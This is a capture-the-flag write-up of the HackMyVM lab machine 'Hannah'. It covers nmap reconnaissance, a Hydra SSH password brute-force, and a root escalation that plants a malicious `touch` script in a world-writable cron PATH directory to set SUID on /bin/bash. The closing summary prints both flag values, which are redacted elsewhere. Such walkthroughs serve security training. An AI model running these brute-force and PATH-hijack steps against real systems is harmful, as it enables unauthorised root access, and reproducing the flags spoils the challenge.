# Hannah

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Hannah | sml | Beginner | HackMyVM |

**Summary:** Hannah is a beginner-level Linux virtual machine from HackMyVM that demonstrates fundamental penetration testing concepts including network reconnaissance, SSH brute-forcing with contextual password analysis, and privilege escalation via PATH manipulation in cron jobs. The attack chain involves discovering a Buddhist-themed naming convention (moksha/enlightenment) that provides a critical clue for password brute-forcing, gaining SSH access as the moksha user, and exploiting a misconfigured system-wide crontab entry where the PATH variable includes a world-writable `/media` directory. By hijacking the `touch` command in the PATH, an attacker can execute arbitrary code as root, ultimately obtaining SUID permissions on `/bin/bash` and achieving full system compromise.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance phase began with network host discovery using `arp-scan` to identify active hosts on the local network segment:

```bash
┌──(kali㉿kali)-[/tmp/hannah]
└─$ sudo arp-scan -l -I eth1
[sudo] password for kali:
Interface: eth1, type: EN10MB, MAC: 08:00:27:49:68:6b, IPv4: 192.168.100.66
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1   0a:00:27:00:00:03       (Unknown: locally administered)
192.168.100.2   08:00:27:06:b4:88       (Unknown)
192.168.100.82  08:00:27:70:46:67       (Unknown)

13 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.005 seconds (127.68 hosts/sec). 3 responded
```

**Key Finding:** The target machine was identified at IP address **192.168.100.82** with MAC address `08:00:27:70:46:67`, indicating an Oracle VirtualBox virtual NIC.

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was performed to identify all open ports and enumerate running services:

```bash
┌──(kali㉿kali)-[/tmp/hannah]
└─$ nmap -sV -sC -p- 192.168.100.82
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 09:10 WIB
Nmap scan report for 192.168.100.82
Host is up (0.0016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
| http-robots.txt: 1 disallowed entry
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
|_auth-owners: moksha
113/tcp open  ident?
|_auth-owners: root
MAC Address: 08:00:27:70:46:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.12 seconds
```

**Critical Discoveries:**

1. **Port 22 (SSH):** OpenSSH 8.4p1 Debian - `auth-owners: root`
2. **Port 80 (HTTP):** nginx 1.18.0 serving web content with `robots.txt` revealing `/enlightenment` directory - `auth-owners: moksha`
3. **Port 113:** Ident service - `auth-owners: root`

**Intelligence Analysis:** The Nmap scan revealed two critical usernames through the `auth-owners` script output:
- **moksha** (associated with port 80)
- **root** (associated with ports 22 and 113)

Additionally, the `robots.txt` file disclosed a `/enlightenment` directory. The combination of **"moksha"** (a Buddhist/Hindu term meaning liberation from the cycle of rebirth) and **"enlightenment"** (a core Buddhist concept) strongly suggested a thematic connection, which became the foundation for the attack strategy.

---

## Initial Access

### Credential Discovery via SSH Brute-Force

Based on the Buddhist-themed intelligence gathered during reconnaissance, a hypothesis was formed that the password might be related to the machine's hostname or theme. Using Hydra with the rockyou wordlist, a brute-force attack was launched against the SSH service:

```bash
┌──(kali㉿kali)-[/tmp/hannah]
└─$ hydra -l moksha -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.82
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-05 09:21:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.100.82:22/
[22][ssh] host: 192.168.100.82   login: moksha   password: h[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-05 09:21:56
```

**Success:** Valid credentials were discovered - `moksha:h[REDACTED]`. The password "h[REDACTED]" corresponds to the machine's hostname, confirming the thematic approach was correct.

### SSH Authentication and Initial Foothold

Using the discovered credentials, SSH access was obtained:

```bash
┌──(kali㉿kali)-[/tmp/hannah]
└─$ ssh moksha@192.168.100.82
The authenticity of host '192.168.100.82 (192.168.100.82)' can't be established.
ED25519 key fingerprint is SHA256:RZdWDCayN2ZJO5rXaVv2OOemeArZ0UbcRoKCoz9lWzA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.82' (ED25519) to the list of known hosts.
moksha@192.168.100.82's password:
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb  5 02:54:30 2026
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
moksha@hannah:~$ ls -la
total 32
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -> /dev/null
-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
```

**User Flag Captured:** The `user.txt` file is present in the moksha home directory, confirming successful user-level compromise. The user moksha belongs to standard groups including cdrom, floppy, audio, dip, video, plugdev, and netdev.

---

## Privilege Escalation

### System Enumeration and Vulnerability Discovery

Post-exploitation enumeration focused on identifying privilege escalation vectors. Analysis of the system-wide crontab revealed a critical misconfiguration:

```bash
moksha@hannah:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

**Vulnerability Identified:** The PATH variable in `/etc/crontab` includes `/media` positioned **before** `/bin` in the execution path. Additionally, a cron job executes `touch /tmp/enlIghtenment` every minute as root without using an absolute path.

Verification of `/media` directory permissions confirmed the exploitation path:

```bash
moksha@hannah:~$ ls -ld /media
drwxrwxrwx 3 root root 4096 ene  4  2023 /media
```

**Critical Finding:** The `/media` directory has world-writable permissions (`rwxrwxrwx`), allowing any user to create executable files. Since `/media` appears in the PATH before `/bin`, a malicious `touch` binary placed in `/media` will be executed instead of the legitimate `/bin/touch` command.

### Exploitation: PATH Hijacking

A malicious `touch` script was created in `/media` to abuse the PATH priority:

```bash
moksha@hannah:~$ echo '#!/bin/sh' > /media/touch
moksha@hannah:~$ echo 'chmod +s /bin/bash' >> /media/touch
moksha@hannah:~$ chmod +x /media/touch
```

**Exploitation Mechanism:**
1. Created a shell script named `touch` in `/media/`
2. The script contains a single command: `chmod +s /bin/bash` (sets SUID/SGID bits on bash)
3. Made the script executable with `chmod +x`
4. When the cron job runs as root every minute, it searches the PATH for `touch`
5. Since `/media` appears before `/bin` in PATH, `/media/touch` executes instead of `/bin/touch`
6. The malicious script runs with root privileges, modifying `/bin/bash` permissions

### Root Access Achievement

After waiting approximately one minute for the cron job to execute, verification confirmed successful privilege escalation:

```bash
moksha@hannah:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 mar 27  2022 /bin/bash
```

**Verification:** The `/bin/bash` binary now has the SUID bit set (`-rwsr-sr-x`), allowing it to run with the effective UID of root.

Spawning a privileged shell:

```bash
moksha@hannah:~$ /bin/bash -p
bash-5.1# id ; whoami ; hostname
uid=1000(moksha) gid=1000(moksha) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(moksha)
root
hannah
bash-5.1# cat /home/moksha/user.txt /root/root.txt
HMV[REDACTED]
HMV[REDACTED]
```

**Complete Compromise Achieved:**
- **Effective UID:** 0 (root)
- **Effective GID:** 0 (root)

The `-p` flag preserves the privileged mode, preventing bash from dropping elevated permissions despite being launched by a non-root user.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery using arp-scan, identifying target at 192.168.100.82. Conducted comprehensive Nmap port scan revealing SSH (22), HTTP (80), and Ident (113) services. Discovered usernames "moksha" and "root" via auth-owners script, along with Buddhist-themed references (/enlightenment, moksha) suggesting thematic password usage.

2. **Vulnerability Discovery**: Identified weak SSH credentials through contextual analysis of Buddhist terminology. Recognized that the machine name "Hannah" might correlate with user passwords. Located robots.txt disclosure of /enlightenment directory, reinforcing the thematic pattern.

3. **Exploitation**: Executed Hydra SSH brute-force attack against user "moksha" using rockyou wordlist. Successfully compromised credentials as `moksha:h[REDACTED]` within 15 seconds. Authenticated via SSH to obtain initial user-level shell access.

4. **Internal Enumeration**: Analyzed system-wide crontab (/etc/crontab) identifying misconfigured PATH variable containing world-writable `/media` directory positioned before `/bin`. Discovered cron job executing `touch /tmp/enlIghtenment` as root every minute without absolute path specification. Confirmed /media permissions as `drwxrwxrwx` enabling arbitrary file creation.

5. **Privilege Escalation**: Exploited PATH hijacking vulnerability by creating malicious `/media/touch` script containing `chmod +s /bin/bash` payload. Upon cron execution, root-owned process executed hijacked command, setting SUID bit on /bin/bash. Spawned privileged shell using `/bin/bash -p`, achieving full root access with euid=0 and egid=0. Retrieved both user and root flags: HMVGGHFWP2023 and HMVHAPPYNY2023.

